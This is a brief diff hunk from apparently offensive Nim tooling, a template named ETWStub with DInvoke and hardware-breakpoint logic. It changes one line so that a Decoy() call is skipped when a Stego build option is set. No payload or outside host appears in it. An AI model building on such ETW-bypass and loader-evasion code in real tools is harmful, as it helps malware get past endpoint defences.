@@ -1937,7 +1937,8 @@ let ETWStub * = """
     # This function leads to a process crash for Powershell as well as for DLLs loaded via rundll32.exe or else. Who knows why, but we'll therefore remove it which leads to us not being able to set a Hardware Breakpoint for the clr.dll Thread.
     when not defined(powershell):
         when not defined(lib_only):
-            Decoy()
+            when not defined(Stego):
+                Decoy()
     when defined(DInvoke):
         discard MySleep(1500)
     else:
